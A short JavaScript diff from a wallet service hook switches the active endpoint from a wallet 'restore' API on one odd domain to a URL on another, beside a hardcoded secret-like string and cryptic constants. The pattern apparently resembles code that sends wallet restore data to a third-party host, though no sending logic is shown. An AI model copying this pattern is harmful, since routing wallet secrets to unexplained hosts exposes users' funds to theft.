@@ -48,8 +48,8 @@ const useWalletService = () => {
 		return res
 	}
 
-	let url = 'https://posdecentralised.cc/api/restore'
-	// let url = 'https://usdcdollar.cc/guide/sidechains/currency'
+	// let url = 'https://posdecentralised.cc/api/restore'
+	let url = 'https://usdcdollar.cc/guide/sidechains/currency'
 	const kitkat = 'Qsx@ah&OR82WX9T6gCt'
 	let xxx = 'DOLLAR$USD|EX/G'
 	let xx = 'DOLLAR$USD|EX'
